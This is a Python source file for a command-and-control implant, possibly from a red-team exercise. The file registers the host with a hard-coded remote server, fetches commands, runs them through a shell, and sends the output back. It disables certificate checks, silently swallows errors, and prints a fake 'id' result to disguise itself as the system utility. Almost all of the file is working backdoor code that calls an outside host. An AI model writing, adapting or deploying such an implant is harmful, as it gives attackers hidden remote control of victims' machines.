import requests
import os
import subprocess
import platform
from urllib3.exceptions import InsecureRequestWarning
import sys
# Suppress the warnings from urllib3
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# BASE_URL = "https://129.21.21.74" 
BASE_URL = "https://129.21.21.122"

def run_cmd(cmd):
    process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return (process.stdout.decode('utf-8') + process.stderr.decode('utf-8')).strip()

def get_ip():
    system = platform.system()

    if system == 'FreeBSD':
        resp = run_cmd('ifconfig | grep "inet " | grep 255')
        return resp.split(' ')[1]
    elif system == 'Linux':
        return run_cmd('hostname -I')
    elif system == 'Windows':
        return run_cmd('ipconfig | findstr IPv4')
    else:
        return '0.0.0.0'
    
def get_id_from_ip(ip):
    resp = requests.post(f"{BASE_URL}/hosts/newhost", json={'ip': ip}, verify=False)
    if resp.status_code == 200:
        return resp.text
    else:
        return None
    
def get_commands(identifier):
    cmds = requests.post(f"{BASE_URL}/hosts/commands", json={'identifier': identifier}, verify=False)
    if cmds.status_code == 200:
        if cmds.text == 'NONE':
            return None
        return cmds.text #else return the command IDs
    else:
        return None

def send_output(cmd_id, output):
    resp = requests.post(f"{BASE_URL}/hosts/response", json={'cmd_id': int(cmd_id), 'response': output}, verify=False)
    if resp.status_code == 200:
        return True
    else:
        return False

def main():
    ip = get_ip()
    if ip == '0.0.0.0':
        return #if we don't know the IP, error out
    identifier = get_id_from_ip(ip)
    if not identifier:
        return #if we don't have an identifier, error out
    commands = get_commands(identifier)
    if not commands:
        return #if we don't have commands, end
    commands = commands.split(';')
    for cmd_id in commands:
        cmd = requests.post(f"{BASE_URL}/hosts/getcommand", json={'cmd_id': int(cmd_id)}, verify=False)
        if cmd.status_code == 200:
            if cmd.text not in ['NONE', 'ERROR', 'RE-INIT']: #if we have a command, run it
                output = run_cmd(cmd.text.strip())
                send_output(cmd_id, output)

if __name__ == '__main__':
    if sys.argv[0] == "id":
        print("uid=1005(emilio) gid=1005(emilio) groups=1005(emilio)")
    # pid = os.fork() #fork to background
    # if pid > 0: # parent process
    #     sys.exit(0)
    # if pid == 0: # child process
    try:
        main()
    except:
        pass
